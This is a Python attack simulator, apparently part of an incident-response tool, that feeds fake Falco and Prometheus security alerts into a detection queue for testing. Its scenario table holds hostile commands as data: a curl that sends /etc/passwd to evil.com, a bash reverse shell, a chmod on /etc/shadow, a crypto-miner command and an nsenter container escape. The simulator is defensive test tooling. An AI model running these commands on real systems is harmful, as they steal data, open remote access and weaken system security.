"""
Attack Simulator - Generates fake security events for testing.
"""

import asyncio
import random
from datetime import datetime
from typing import Dict, Any
import structlog

from core import queue

log = structlog.get_logger()

# Attack scenarios
ATTACK_SCENARIOS = {
    "cryptominer": {
        "type": "cryptominer",
        "source": "falco",
        "details": {
            "process": "xmrig",
            "command": "/tmp/xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444",
            "cpu_usage": 95,
            "memory_usage": 45,
            "network_bytes": 1024000,
            "process_count": 5,
            "open_files": 20
        },
        "raw": {
            "rule": "Detect crypto miners using the Stratum protocol",
            "priority": "Critical",
            "output": "Crypto mining detected (user=root command=xmrig pool=pool.minexmr.com)"
        }
    },
    "data_exfiltration": {
        "type": "data_exfiltration",
        "source": "falco",
        "details": {
            "process": "curl",
            "command": "curl -X POST https://evil.com/exfil -d @/etc/passwd",
            "cpu_usage": 10,
            "memory_usage": 5,
            "network_bytes": 500000,
            "process_count": 2,
            "open_files": 5
        },
        "raw": {
            "rule": "Detect data exfiltration to external domain",
            "priority": "Critical",
            "output": "Suspicious outbound connection (user=www-data dest=evil.com)"
        }
    },
    "privilege_escalation": {
        "type": "privilege_escalation",
        "source": "falco",
        "details": {
            "process": "sudo",
            "command": "sudo chmod 777 /etc/shadow",
            "cpu_usage": 5,
            "memory_usage": 2,
            "network_bytes": 0,
            "process_count": 1,
            "open_files": 3
        },
        "raw": {
            "rule": "Detect privilege escalation via sudo",
            "priority": "Critical",
            "output": "Privilege escalation attempt (user=attacker file=/etc/shadow)"
        }
    },
    "reverse_shell": {
        "type": "reverse_shell",
        "source": "falco",
        "details": {
            "process": "bash",
            "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "cpu_usage": 5,
            "memory_usage": 3,
            "network_bytes": 10000,
            "process_count": 2,
            "open_files": 4
        },
        "raw": {
            "rule": "Detect reverse shell",
            "priority": "Critical",
            "output": "Reverse shell detected (user=www-data dest=10.0.0.1:4444)"
        }
    },
    "container_escape": {
        "type": "container_escape",
        "source": "falco",
        "details": {
            "process": "nsenter",
            "command": "nsenter --target 1 --mount --uts --ipc --net --pid",
            "cpu_usage": 10,
            "memory_usage": 5,
            "network_bytes": 0,
            "process_count": 1,
            "open_files": 10,
            "docker_sock_access": True
        },
        "raw": {
            "rule": "Detect container escape attempt",
            "priority": "Critical",
            "output": "Container escape via nsenter (user=root target_pid=1)"
        }
    },
    "suspicious_port_scan": {
        "type": "suspicious_process",
        "source": "prometheus",
        "details": {
            "process": "nmap",
            "command": "nmap -sS -p- 192.168.1.0/24",
            "cpu_usage": 30,
            "memory_usage": 15,
            "network_bytes": 50000,
            "process_count": 1,
            "open_files": 100
        },
        "raw": {
            "alert": "high_network_activity",
            "metric": "network_connections_total",
            "value": 1000
        }
    },
    "anomalous_cpu": {
        "type": "anomalous_network",
        "source": "prometheus",
        "details": {
            "process": "unknown",
            "cpu_usage": 99,
            "memory_usage": 80,
            "network_bytes": 0,
            "process_count": 50,
            "open_files": 500
        },
        "raw": {
            "alert": "high_cpu_usage",
            "metric": "container_cpu_usage_percent",
            "value": 99
        }
    }
}

RESOURCES = [
    "nginx-deployment-7b6f9c7d8-abc12",
    "api-server-5f7d9c8e6-xyz99",
    "redis-master-0",
    "postgres-db-1",
    "worker-deployment-3c4d5e6f-def45",
    "auth-service-8a9b0c1d-ghi78"
]

NAMESPACES = [
    "production",
    "staging",
    "default",
    "kube-system"
]

class AttackSimulator:
    """Simulates security attacks for testing the IR system."""
    
    def __init__(self):
        self.running = False
    
    async def start(self, interval: float = 30.0, attack_type: str = None):
        """Start generating attacks at specified interval."""
        self.running = True
        log.info("Attack Simulator started", interval=interval)
        
        while self.running:
            await self.generate_attack(attack_type)
            await asyncio.sleep(interval)
    
    async def stop(self):
        """Stop the simulator."""
        self.running = False
        log.info("Attack Simulator stopped")
    
    async def generate_attack(self, attack_type: str = None) -> Dict[str, Any]:
        """Generate a single attack event."""
        if attack_type and attack_type in ATTACK_SCENARIOS:
            scenario = ATTACK_SCENARIOS[attack_type]
        else:
            scenario = random.choice(list(ATTACK_SCENARIOS.values()))
        
        event = {
            **scenario,
            "resource": random.choice(RESOURCES),
            "namespace": random.choice(NAMESPACES),
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Add some randomization
        event["details"]["cpu_usage"] = min(100, event["details"]["cpu_usage"] + random.randint(-10, 10))
        event["details"]["memory_usage"] = min(100, event["details"]["memory_usage"] + random.randint(-5, 5))
        
        log.info("Attack generated", 
                 type=event["type"], 
                 resource=event["resource"],
                 namespace=event["namespace"])
        
        # Push to detection queue
        await queue.push("detection", event)
        
        return event
    
    async def generate_batch(self, count: int = 5, attack_type: str = None):
        """Generate multiple attacks quickly."""
        log.info("Generating batch attacks", count=count)
        
        for _ in range(count):
            await self.generate_attack(attack_type)
            await asyncio.sleep(0.5)  # Small delay between attacks

# Singleton
attack_simulator = AttackSimulator()

# CLI interface
async def main():
    """CLI for attack simulation."""
    import sys
    
    from core import queue as q
    await q.connect()
    
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        
        if cmd == "single":
            attack_type = sys.argv[2] if len(sys.argv) > 2 else None
            await attack_simulator.generate_attack(attack_type)
        
        elif cmd == "batch":
            count = int(sys.argv[2]) if len(sys.argv) > 2 else 5
            attack_type = sys.argv[3] if len(sys.argv) > 3 else None
            await attack_simulator.generate_batch(count, attack_type)
        
        elif cmd == "continuous":
            interval = float(sys.argv[2]) if len(sys.argv) > 2 else 30.0
            attack_type = sys.argv[3] if len(sys.argv) > 3 else None
            await attack_simulator.start(interval, attack_type)
        
        elif cmd == "list":
            print("Available attack types:")
            for name, scenario in ATTACK_SCENARIOS.items():
                print(f"  - {name}: {scenario['raw'].get('rule', scenario['raw'].get('alert', 'N/A'))}")
        
        else:
            print(f"Unknown command: {cmd}")
            print("Usage: python -m attack_simulator [single|batch|continuous|list] [args...]")
    else:
        print("Attack Simulator")
        print("Usage:")
        print("  python -m attack_simulator single [attack_type]")
        print("  python -m attack_simulator batch [count] [attack_type]")
        print("  python -m attack_simulator continuous [interval] [attack_type]")
        print("  python -m attack_simulator list")
    
    await q.disconnect()

if __name__ == "__main__":
    asyncio.run(main())
